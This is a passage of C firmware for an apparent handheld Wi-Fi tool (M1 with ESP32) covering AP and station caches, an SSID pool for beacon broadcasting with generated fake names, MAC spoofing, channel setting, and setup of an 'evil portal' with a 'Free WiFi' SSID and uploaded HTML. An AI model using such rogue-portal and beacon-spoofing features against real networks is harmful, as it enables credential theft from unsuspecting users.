		strncpy(ln, ap_list[ap_view_idx].ssid, 24);
		ln[24] = '\0';
	}
	u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

	u8g2_DrawStr(&m1_u8g2, 2, y, ap_list[ap_view_idx].bssid_str); y += SF_Y_STEP;
	snprintf(ln, sizeof(ln), "CH:%d RSSI:%ddBm",
		ap_list[ap_view_idx].channel, ap_list[ap_view_idx].rssi);
	u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
	snprintf(ln, sizeof(ln), "Auth:%d", ap_list[ap_view_idx].auth_mode);
	u8g2_DrawStr(&m1_u8g2, 2, y, ln);
	u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit [^v]Move");
	m1_u8g2_nextpage();
}

void wifi_general_view_ap_info(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;

	if (!ap_list || ap_count == 0)
	{
		wifi_show_message("View AP Info", "No AP cache", "Scan or Load APs");
		return;
	}

	if (ap_view_idx >= ap_count) ap_view_idx = 0;
	wifi_draw_ap_info();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				ap_view_idx = (ap_view_idx == 0) ? ap_count - 1 : ap_view_idx - 1;
				wifi_draw_ap_info();
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				ap_view_idx++;
				if (ap_view_idx >= ap_count) ap_view_idx = 0;
				wifi_draw_ap_info();
			}
		}
	}
}

void wifi_general_save_aps(void)
{
	FIL fil;
	UINT bw;
	char line[WIFI_AP_CACHE_LINE_MAX];

	if (!ap_list || ap_count == 0)
	{
		ensure_esp32_ready();
		wifi_show_message("Save APs", "Scanning APs...", NULL);
		if (wifi_do_scan() == 0)
		{
			wifi_show_message("Save APs", "No APs found", NULL);
			return;
		}
	}

	f_mkdir(WIFI_AP_CACHE_DIR);
	if (f_open(&fil, WIFI_AP_CACHE_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
	{
		wifi_show_message("Save APs", "File open failed", NULL);
		return;
	}

	const char *hdr = "# ssid\tbssid\tchannel\trssi\tauth\r\n";
	f_write(&fil, hdr, strlen(hdr), &bw);
	for (uint16_t i = 0; i < ap_count; i++)
	{
		char ssid[33];
		wifi_sanitize_field(ssid, ap_list[i].ssid, sizeof(ssid));
		int len = snprintf(line, sizeof(line), "%s\t%s\t%d\t%d\t%d\r\n",
			ssid, ap_list[i].bssid_str, ap_list[i].channel,
			ap_list[i].rssi, ap_list[i].auth_mode);
		if (len > 0)
		{
			f_write(&fil, line, len, &bw);
		}
	}
	f_close(&fil);

	snprintf(line, sizeof(line), "Saved %d APs", ap_count);
	wifi_show_message("Save APs", line, WIFI_AP_CACHE_FILE);
}

void wifi_general_load_aps(void)
{
	S_M1_file_info *f_info;
	FIL fil;
	char path[128];
	char line[WIFI_AP_CACHE_LINE_MAX];
	wifi_ap_t *new_list;
	uint16_t new_count = 0;

	f_info = storage_browse();
	if (!f_info || !f_info->file_is_selected)
	{
		return;
	}

	if (!wifi_ext_is_ap_cache(f_info->file_name))
	{
		wifi_show_message("Load APs", "Use .tsv/.txt", "AP cache format");
		return;
	}

	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
	{
		wifi_show_message("Load APs", "Bad path", NULL);
		return;
	}

	if (f_open(&fil, path, FA_READ) != FR_OK)
	{
		wifi_show_message("Load APs", "File open failed", NULL);
		return;
	}

	new_list = (wifi_ap_t *)malloc(WIFI_AP_MAX * sizeof(wifi_ap_t));
	if (!new_list)
	{
		f_close(&fil);
		wifi_show_message("Load APs", "No memory", NULL);
		return;
	}
	memset(new_list, 0, WIFI_AP_MAX * sizeof(wifi_ap_t));

	while (new_count < WIFI_AP_MAX && f_gets(line, sizeof(line), &fil) != NULL)
	{
		char *ssid;
		char *bssid_s;
		char *ch_s;
		char *rssi_s;
		char *auth_s;
		wifi_ap_t *ap;

		ssid = beacon_trim_line(line);
		if (ssid[0] == '\0' || ssid[0] == '#' || ssid[0] == ';')
		{
			continue;
		}

		bssid_s = strchr(ssid, '\t');
		if (!bssid_s) continue;
		*bssid_s++ = '\0';
		ch_s = strchr(bssid_s, '\t');
		if (!ch_s) continue;
		*ch_s++ = '\0';
		rssi_s = strchr(ch_s, '\t');
		if (!rssi_s) continue;
		*rssi_s++ = '\0';
		auth_s = strchr(rssi_s, '\t');
		if (!auth_s) continue;
		*auth_s++ = '\0';

		ap = &new_list[new_count];
		strncpy(ap->ssid, ssid, 32);
		ap->ssid[32] = '\0';
		if (!wifi_parse_bssid(bssid_s, ap->bssid))
		{
			continue;
		}
		strncpy(ap->bssid_str, bssid_s, sizeof(ap->bssid_str) - 1);
		ap->bssid_str[sizeof(ap->bssid_str) - 1] = '\0';
		ap->channel = (uint8_t)atoi(ch_s);
		ap->rssi = (int8_t)atoi(rssi_s);
		ap->auth_mode = (uint8_t)atoi(auth_s);
		new_count++;
	}
	f_close(&fil);

	if (new_count == 0)
	{
		free(new_list);
		wifi_show_message("Load APs", "No APs loaded", NULL);
		return;
	}

	wifi_ap_list_free();
	ap_list = new_list;
	ap_count = new_count;
	ap_view_idx = 0;

	snprintf(line, sizeof(line), "Loaded %d APs", ap_count);
	wifi_show_message("Load APs", line, NULL);
}

void wifi_general_clear_aps(void)
{
	wifi_ap_list_free();
	wifi_show_message("Clear APs", "AP cache cleared", NULL);
}

void wifi_general_save_stations(void)
{
	FIL fil;
	UINT bw;
	char line[WIFI_AP_CACHE_LINE_MAX];
	char ssid[33];

	if (!sta_list_data || sta_total == 0)
	{
		wifi_show_message("Save Stations", "No station cache", "Scan Stations first");
		return;
	}

	f_mkdir(WIFI_AP_CACHE_DIR);
	if (f_open(&fil, WIFI_STA_CACHE_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
	{
		wifi_show_message("Save Stations", "File open failed", NULL);
		return;
	}

	const char *hdr = "# mac\tbssid\tchannel\trssi\tssid\r\n";
	f_write(&fil, hdr, strlen(hdr), &bw);
	for (uint16_t i = 0; i < sta_total; i++)
	{
		wifi_sanitize_field(ssid, sta_list_data[i].ssid, sizeof(ssid));
		int len = snprintf(line, sizeof(line),
			"%s\t%02X:%02X:%02X:%02X:%02X:%02X\t%d\t%d\t%s\r\n",
			sta_list_data[i].mac_str,
			sta_list_data[i].bssid[0], sta_list_data[i].bssid[1],
			sta_list_data[i].bssid[2], sta_list_data[i].bssid[3],
			sta_list_data[i].bssid[4], sta_list_data[i].bssid[5],
			sta_list_data[i].channel, sta_list_data[i].rssi, ssid);
		if (len > 0)
		{
			f_write(&fil, line, len, &bw);
		}
	}
	f_close(&fil);

	snprintf(line, sizeof(line), "Saved %d STAs", sta_total);
	wifi_show_message("Save Stations", line, WIFI_STA_CACHE_FILE);
}

void wifi_general_load_stations(void)
{
	S_M1_file_info *f_info;
	FIL fil;
	char path[128];
	char line[WIFI_AP_CACHE_LINE_MAX];
	wifi_sta_t *new_list;
	uint16_t new_count = 0;

	f_info = storage_browse();
	if (!f_info || !f_info->file_is_selected)
	{
		return;
	}

	if (!wifi_ext_is_ap_cache(f_info->file_name))
	{
		wifi_show_message("Load Stations", "Use .tsv/.txt", "Station cache");
		return;
	}

	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
	{
		wifi_show_message("Load Stations", "Bad path", NULL);
		return;
	}

	if (f_open(&fil, path, FA_READ) != FR_OK)
	{
		wifi_show_message("Load Stations", "File open failed", NULL);
		return;
	}

	new_list = (wifi_sta_t *)malloc(STA_MAX * sizeof(wifi_sta_t));
	if (!new_list)
	{
		f_close(&fil);
		wifi_show_message("Load Stations", "No memory", NULL);
		return;
	}
	memset(new_list, 0, STA_MAX * sizeof(wifi_sta_t));

	while (new_count < STA_MAX && f_gets(line, sizeof(line), &fil) != NULL)
	{
		char *mac_s;
		char *bssid_s;
		char *ch_s;
		char *rssi_s;
		char *ssid_s;
		wifi_sta_t *sta;

		mac_s = beacon_trim_line(line);
		if (mac_s[0] == '\0' || mac_s[0] == '#' || mac_s[0] == ';')
		{
			continue;
		}

		bssid_s = strchr(mac_s, '\t');
		if (!bssid_s) continue;
		*bssid_s++ = '\0';
		ch_s = strchr(bssid_s, '\t');
		if (!ch_s) continue;
		*ch_s++ = '\0';
		rssi_s = strchr(ch_s, '\t');
		if (!rssi_s) continue;
		*rssi_s++ = '\0';
		ssid_s = strchr(rssi_s, '\t');
		if (!ssid_s) continue;
		*ssid_s++ = '\0';

		sta = &new_list[new_count];
		if (!wifi_parse_bssid(mac_s, sta->mac) || !wifi_parse_bssid(bssid_s, sta->bssid))
		{
			continue;
		}
		wifi_format_mac(sta->mac, sta->mac_str, sizeof(sta->mac_str));
		sta->channel = (uint8_t)atoi(ch_s);
		sta->rssi = (int8_t)atoi(rssi_s);
		strncpy(sta->ssid, ssid_s, 32);
		sta->ssid[32] = '\0';
		new_count++;
	}
	f_close(&fil);

	if (new_count == 0)
	{
		free(new_list);
		wifi_show_message("Load Stations", "No STAs loaded", NULL);
		return;
	}

	sta_list_free();
	sta_list_data = new_list;
	sta_total = new_count;
	sta_view_idx = 0;

	snprintf(line, sizeof(line), "Loaded %d STAs", sta_total);
	wifi_show_message("Load Stations", line, NULL);
}

void wifi_general_clear_stations(void)
{
	sta_list_free();
	wifi_show_message("Clear Stations", "Station cache clear", NULL);
}

static bool wifi_ssid_pool_add_one(const char *ssid)
{
	m1_cmd_t cmd;
	m1_resp_t resp;
	uint8_t len;
	int ret;

	if (!ssid || ssid[0] == '\0')
	{
		return false;
	}

	len = (uint8_t)strnlen(ssid, 32);
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_SSID_ADD;
	memcpy(cmd.payload, ssid, len);
	cmd.payload[len] = '\0';
	cmd.payload_len = len + 1;

	ret = m1_esp32_send_cmd(&cmd, &resp, 1000);
	return (ret == 0 && resp.status == RESP_OK);
}

void wifi_general_add_ssid(void)
{
	char ssid[33] = {0};
	char ln[26];

	ensure_esp32_ready();

	if (beacon_file_count >= BEACON_LIST_MAX_SSIDS)
	{
		wifi_show_message("Add SSID", "Local list full", "Save or Clear");
		return;
	}

	if (m1_vkb_get_text("SSID:", "", ssid, 32) == 0)
	{
		return;
	}

	if (ssid[0] == '\0')
	{
		wifi_show_message("Add SSID", "Empty SSID", NULL);
		return;
	}

	if (beacon_ssid_exists(beacon_file_count, ssid))
	{
		wifi_show_message("Add SSID", "Already in list", ssid);
		return;
	}

	if (!wifi_ssid_pool_add_one(ssid))
	{
		wifi_show_message("Add SSID", "Add failed", "Flash ESP32 FW?");
		return;
	}

	size_t len = strnlen(ssid, 32);
	memcpy(beacon_file_ssids[beacon_file_count], ssid, len);
	beacon_file_ssids[beacon_file_count][len] = '\0';
	beacon_file_ptrs[beacon_file_count] = beacon_file_ssids[beacon_file_count];
	beacon_file_count++;

	snprintf(ln, sizeof(ln), "SSIDs:%u", beacon_file_count);
	wifi_show_message("Add SSID", "Added", ln);
}

void wifi_general_generate_ssids(void)
{
	static const char *prefixes[] = {"M1", "Guest", "FreeWiFi", "Router"};
	beacon_load_diag_t load_diag;
	uint32_t seed;
	uint8_t total;
	char ln[26];

	ensure_esp32_ready();

	memset(beacon_file_ssids, 0, sizeof(beacon_file_ssids));
	memset(beacon_file_ptrs, 0, sizeof(beacon_file_ptrs));
	beacon_file_count = BEACON_RANDOM_PICK_N;
	seed = HAL_GetTick() ^ 0xA5365A5Au;

	for (uint8_t i = 0; i < beacon_file_count; i++)
	{
		seed = beacon_list_random_next(&seed);
		snprintf(beacon_file_ssids[i], sizeof(beacon_file_ssids[i]), "%s-%04lX",
			prefixes[i % 4], (unsigned long)(seed & 0xFFFFu));
		beacon_file_ptrs[i] = beacon_file_ssids[i];
	}

	total = beacon_batch_load(beacon_file_ptrs, beacon_file_count, &load_diag);
	if (total == 0)
	{
		beacon_load_failed_screen("Generate SSIDs", &load_diag);
		HAL_Delay(2000);
		return;
	}

	snprintf(ln, sizeof(ln), "Generated %u", total);
	wifi_show_message("Generate SSIDs", ln, "ESP32 pool ready");
}

void wifi_general_save_ssids(void)
{
	FIL fil;
	UINT bw;
	char line[48];

	if (beacon_file_count == 0)
	{
		wifi_show_message("Save SSIDs", "No local SSIDs", "Load/Add first");
		return;
	}

	f_mkdir(WIFI_AP_CACHE_DIR);
	if (f_open(&fil, WIFI_SSID_LIST_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
	{
		wifi_show_message("Save SSIDs", "File open failed", NULL);
		return;
	}

	for (uint8_t i = 0; i < beacon_file_count; i++)
	{
		int len = snprintf(line, sizeof(line), "%s\r\n", beacon_file_ssids[i]);
		if (len > 0)
		{
			f_write(&fil, line, len, &bw);
		}
	}
	f_close(&fil);

	snprintf(line, sizeof(line), "Saved %u SSIDs", beacon_file_count);
	wifi_show_message("Save SSIDs", line, WIFI_SSID_LIST_FILE);
}

void wifi_general_load_ssids(void)
{
	S_M1_file_info *f_info;
	beacon_load_diag_t load_diag;
	char ln[26];
	uint8_t count;
	uint8_t total;

	ensure_esp32_ready();

	f_info = storage_browse();
	if (!f_info || !f_info->file_is_selected)
	{
		return;
	}

	if (!beacon_ext_is_list(f_info->file_name))
	{
		wifi_show_message("Load SSIDs", "Use .txt/.lst", "1 SSID per line");
		return;
	}

	count = beacon_load_list_file(f_info);
	if (count == 0)
	{
		wifi_show_message("Load SSIDs", "No SSIDs loaded", NULL);
		return;
	}

	total = beacon_batch_load(beacon_file_ptrs, count, &load_diag);
	if (total == 0)
	{
		beacon_load_failed_screen("Load SSIDs", &load_diag);
		HAL_Delay(2000);
		return;
	}

	snprintf(ln, sizeof(ln), "Loaded %d SSIDs", total);
	wifi_show_message("Load SSIDs", ln, "ESP32 pool ready");
}

void wifi_general_clear_ssids(void)
{
	m1_resp_t resp;
	int ret;

	ensure_esp32_ready();
	ret = m1_esp32_simple_cmd(CMD_SSID_CLEAR, &resp, 1000);
	if (ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("Clear SSIDs", "Clear failed", NULL);
		return;
	}

	memset(beacon_file_ssids, 0, sizeof(beacon_file_ssids));
	memset(beacon_file_ptrs, 0, sizeof(beacon_file_ptrs));
	beacon_file_count = 0;
	wifi_show_message("Clear SSIDs", "SSID pool cleared", NULL);
}

static bool wifi_join_choose_password(char *password, size_t password_len)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint8_t sel = 0;
	bool redraw = true;

	while (1)
	{
		if (redraw)
		{
			redraw = false;
			m1_u8g2_firstpage();
			u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
			u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "JOIN WIFI");

			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
			u8g2_DrawStr(&m1_u8g2, 2, 26, sel == 0 ? "> Open/no pass" : "  Open/no pass");
			u8g2_DrawStr(&m1_u8g2, 2, 38, sel == 1 ? "> Enter pass" : "  Enter pass");
			u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Select [BACK]Exit");
			m1_u8g2_nextpage();
		}

		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;

		xQueueReceive(button_events_q_hdl, &btn, 0);
		if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			xQueueReset(main_q_hdl);
			return false;
		}
		else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK ||
			btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
		{
			sel = sel ? 0 : 1;
			redraw = true;
		}
		else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			if (sel == 0)
			{
				password[0] = '\0';
				xQueueReset(main_q_hdl);
				return true;
			}

			memset(password, 0, password_len);
			if (m1_vkb_get_text("WiFi password:", "", password, WIFI_JOIN_PASS_MAX) == 0)
			{
				redraw = true;
				continue;
			}
			xQueueReset(main_q_hdl);
			return true;
		}
	}
}

static bool wifi_join_select_ap(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;

	if (!ap_list || ap_count == 0)
	{
		ensure_esp32_ready();
		wifi_show_message("Join WiFi", "Scanning APs...", NULL);
		if (wifi_do_scan() == 0)
		{
			wifi_show_message("Join WiFi", "No APs found", NULL);
			return false;
		}
	}

	if (ap_view_idx >= ap_count) ap_view_idx = 0;
	wifi_draw_ap_info();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;

		xQueueReceive(button_events_q_hdl, &btn, 0);
		if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			xQueueReset(main_q_hdl);
			return false;
		}
		else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
		{
			ap_view_idx = (ap_view_idx == 0) ? ap_count - 1 : ap_view_idx - 1;
			wifi_draw_ap_info();
		}
		else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
		{
			ap_view_idx++;
			if (ap_view_idx >= ap_count) ap_view_idx = 0;
			wifi_draw_ap_info();
		}
		else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			xQueueReset(main_q_hdl);
			return true;
		}
	}
}

void wifi_general_join_wifi(void)
{
	m1_cmd_t cmd;
	m1_resp_t resp;
	char password[WIFI_JOIN_PASS_MAX + 1];
	char line[26];
	uint8_t ssid_len;
	uint8_t pass_len;
	int ret;

	if (!wifi_join_select_ap())
	{
		return;
	}

	if (!wifi_join_choose_password(password, sizeof(password)))
	{
		return;
	}

	ssid_len = (uint8_t)strnlen(ap_list[ap_view_idx].ssid, 32);
	pass_len = (uint8_t)strnlen(password, WIFI_JOIN_PASS_MAX);
	if (ssid_len == 0)
	{
		wifi_show_message("Join WiFi", "Hidden SSID", "not supported yet");
		return;
	}

	ensure_esp32_ready();
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_WIFI_JOIN;
	cmd.payload[0] = ssid_len;
	cmd.payload[1] = pass_len;
	memcpy(&cmd.payload[2], ap_list[ap_view_idx].ssid, ssid_len);
	memcpy(&cmd.payload[2 + ssid_len], password, pass_len);
	cmd.payload_len = 2 + ssid_len + pass_len;

	wifi_show_message("Join WiFi", "Connecting...", ap_list[ap_view_idx].ssid);
	ret = m1_esp32_send_cmd(&cmd, &resp, 10000);
	if (ret != 0 || resp.status == RESP_ERR)
	{
		wifi_show_message("Join WiFi", "Connect failed", "Check password");
		return;
	}
	if (resp.status == RESP_BUSY)
	{
		wifi_show_message("Join WiFi", "Still connecting", "Try status later");
		return;
	}

	if (resp.payload_len >= 2)
	{
		snprintf(line, sizeof(line), "CH:%d RSSI:%ddBm", resp.payload[0], (int8_t)resp.payload[1]);
		wifi_show_message("Join WiFi", "Connected", line);
	}
	else
	{
		wifi_show_message("Join WiFi", "Connected", NULL);
	}
}

static void wifi_make_local_mac(uint8_t mac[6], uint8_t salt)
{
	uint32_t x = HAL_GetTick() ^ ((uint32_t)salt << 24) ^ 0xA5C35A3C;

	for (uint8_t i = 0; i < 6; i++)
	{
		x ^= x << 13;
		x ^= x >> 17;
		x ^= x << 5;
		mac[i] = (uint8_t)(x >> 8);
	}

	mac[0] &= 0xFE;
	mac[0] |= 0x02;
}

static bool wifi_send_set_mac(uint8_t iface, const uint8_t mac[6])
{
	m1_cmd_t cmd;
	m1_resp_t resp;
	uint8_t out_mac[6];
	char line[26];
	int ret;

	ensure_esp32_ready();

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_WIFI_SET_MAC;
	cmd.payload_len = 7;
	cmd.payload[0] = iface;
	memcpy(&cmd.payload[1], mac, 6);

	ret = m1_esp32_send_cmd(&cmd, &resp, 2000);
	if (ret != 0 || resp.status != RESP_OK || resp.payload_len < 7)
	{
		wifi_show_message("Set MACs", "Set failed", "Flash ESP32 FW?");
		return false;
	}

	memcpy(out_mac, &resp.payload[1], 6);
	snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X",
		out_mac[0], out_mac[1], out_mac[2], out_mac[3], out_mac[4], out_mac[5]);
	wifi_show_message("Set MACs", iface ? "AP MAC set" : "STA MAC set", line);
	return true;
}

static bool wifi_edit_mac(uint8_t mac[6])
{
	char data[18];

	m1_byte_to_hextext(mac, 6, data);
	if (m1_vkbs_get_data("Enter MAC:", data) == 0)
	{
		return false;
	}

	memset(mac, 0, 6);
	if (m1_strtob_with_base(data, mac, 6, 16) != 6)
	{
		wifi_show_message("Set MACs", "Need 6 bytes", "Example: 02 11...");
		return false;
	}

	mac[0] &= 0xFE;
	mac[0] |= 0x02;
	return true;
}

void wifi_general_set_macs(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint8_t sel = 0;
	bool redraw = true;
	const char *items[] = {"STA Random", "AP Random", "STA Manual", "AP Manual"};

	while (1)
	{
		if (redraw)
		{
			redraw = false;
			m1_u8g2_firstpage();
			u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
			u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "SET MACS");

			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
			for (uint8_t i = 0; i < 4; i++)
			{
				char line[26];
				snprintf(line, sizeof(line), "%c %s", (i == sel) ? '>' : ' ', items[i]);
				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + i * SF_Y_STEP, line);
			}
			u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Set [BACK]Exit");
			m1_u8g2_nextpage();
		}

		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;

		xQueueReceive(button_events_q_hdl, &btn, 0);
		if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			xQueueReset(main_q_hdl);
			break;
		}
		else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
		{
			sel = (sel == 0) ? 3 : sel - 1;
			redraw = true;
		}
		else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
		{
			sel = (sel + 1) % 4;
			redraw = true;
		}
		else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			uint8_t mac[6];
			uint8_t iface = (sel == 1 || sel == 3) ? 1 : 0;

			wifi_make_local_mac(mac, sel);
			if (sel < 2 || wifi_edit_mac(mac))
			{
				wifi_send_set_mac(iface, mac);
			}
			redraw = true;
		}
	}
}

void wifi_general_set_channel(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint8_t channel = 6;
	bool redraw = true;

	while (1)
	{
		if (redraw)
		{
			char line[26];
			redraw = false;

			m1_u8g2_firstpage();
			u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
			u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "SET CHANNEL");

			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
			snprintf(line, sizeof(line), "Channel: %d", channel);
			u8g2_DrawStr(&m1_u8g2, 2, 28, line);
			u8g2_DrawStr(&m1_u8g2, 2, 42, "UP/DOWN change");
			u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Set [BACK]Exit");
			m1_u8g2_nextpage();
		}

		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;

		xQueueReceive(button_events_q_hdl, &btn, 0);
		if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			xQueueReset(main_q_hdl);
			break;
		}
		else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
		{
			channel = (channel >= 13) ? 1 : channel + 1;
			redraw = true;
		}
		else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
		{
			channel = (channel <= 1) ? 13 : channel - 1;
			redraw = true;
		}
		else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
		{
			m1_cmd_t cmd;
			m1_resp_t resp;
			int spi_ret;
			char line[26];

			ensure_esp32_ready();
			memset(&cmd, 0, sizeof(cmd));
			cmd.magic = M1_CMD_MAGIC;
			cmd.cmd_id = CMD_WIFI_SET_CHANNEL;
			cmd.payload_len = 1;
			cmd.payload[0] = channel;

			spi_ret = m1_esp32_send_cmd(&cmd, &resp, 2000);
			if (spi_ret != 0 || resp.status != RESP_OK)
			{
				wifi_show_message("Set Channel", "Set failed", "Flash ESP32 FW?");
			}
			else
			{
				snprintf(line, sizeof(line), "Channel %d set", channel);
				wifi_show_message("Set Channel", line, NULL);
			}
			redraw = true;
		}
	}
}

void wifi_general_shutdown_wifi(void)
{
	m1_resp_t resp;
	int ret;

	ensure_esp32_ready();
	ret = m1_esp32_simple_cmd(CMD_WIFI_DISCONNECT, &resp, 2000);
	if (ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("Shutdown WiFi", "Command failed", "Flash ESP32 FW?");
		return;
	}

	wifi_show_message("Shutdown WiFi", "WiFi radio idle", "STA mode restored");
}

void wifi_general_set_ep_ssid(void)
{
	char new_ssid[33];

	wifi_portal_cfg_load();
	memset(new_ssid, 0, sizeof(new_ssid));
	if (m1_vkb_get_text("Portal SSID:", wifi_portal_ssid, new_ssid, 32) == 0)
	{
		return;
	}

	strncpy(wifi_portal_ssid, new_ssid, sizeof(wifi_portal_ssid) - 1);
	wifi_portal_ssid[sizeof(wifi_portal_ssid) - 1] = '\0';
	if (wifi_portal_ssid[0] == '\0')
	{
		strcpy(wifi_portal_ssid, "Free WiFi");
	}
	wifi_portal_cfg_save();
	wifi_show_message("Portal SSID", "Saved", wifi_portal_ssid);
}

static bool wifi_portal_upload_html_path(const char *path, const char *display_name,
	bool show_success)
{
	FIL fil;
	FRESULT fr;
	m1_cmd_t cmd;
	m1_resp_t resp;
	char line[26];
	char file_line[26];
	uint8_t buf[EP_HTML_CHUNK_BYTES];
	uint32_t total = 0;
	UINT br = 0;
	int ret;

	if (!path || path[0] == '\0')
	{
		wifi_show_message("EP HTML", "No file selected", NULL);
		return false;
	}

	fr = f_open(&fil, path, FA_READ);
	if (fr != FR_OK)
	{
		wifi_show_message("EP HTML", "Open failed", NULL);
		return false;
	}

	if (f_size(&fil) > EP_HTML_MAX_BYTES)
	{
		f_close(&fil);
		wifi_show_message("EP HTML", "File too large", "Max 32KB");
		return false;
	}

	ensure_esp32_ready();
	ret = m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
	if (ret != 0 || resp.status != RESP_OK)
	{
		f_close(&fil);
		wifi_show_message("EP HTML", "Clear failed", "Flash ESP32 FW?");
		return false;
	}

	snprintf(file_line, sizeof(file_line), "%.24s", display_name ? display_name : "portal.html");
	wifi_show_message("EP HTML", "Uploading...", file_line);

	while (1)
	{
		fr = f_read(&fil, buf, sizeof(buf), &br);
		if (fr != FR_OK)
		{
			m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
			f_close(&fil);
			wifi_show_message("EP HTML", "Read failed", NULL);
			return false;
		}

		if (br == 0)
		{
			break;
		}

		memset(&cmd, 0, sizeof(cmd));
		cmd.magic = M1_CMD_MAGIC;
		cmd.cmd_id = CMD_PORTAL_HTML_ADD;
		cmd.payload_len = (uint8_t)br;
		memcpy(cmd.payload, buf, br);

		ret = m1_esp32_send_cmd(&cmd, &resp, 2000);
		if (ret != 0 || resp.status != RESP_OK)
		{
			m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
			f_close(&fil);
			wifi_show_message("EP HTML", "Upload failed", "Flash ESP32 FW?");
			return false;
		}

		total += br;
	}

	f_close(&fil);

	if (total == 0)
	{
		m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
		wifi_show_message("EP HTML", "Empty file", NULL);
		return false;
	}

	if (show_success)
	{
		snprintf(line, sizeof(line), "Loaded %lu bytes", (unsigned long)total);
		wifi_show_message("EP HTML", line, "Ready for portal");
	}
	return true;
}

void wifi_general_select_ep_html(void)
{
	S_M1_file_info *f_info;
	char path[128];

	wifi_portal_cfg_load();
	f_info = storage_browse();
	if (!f_info || !f_info->file_is_selected)
	{
		return;
	}

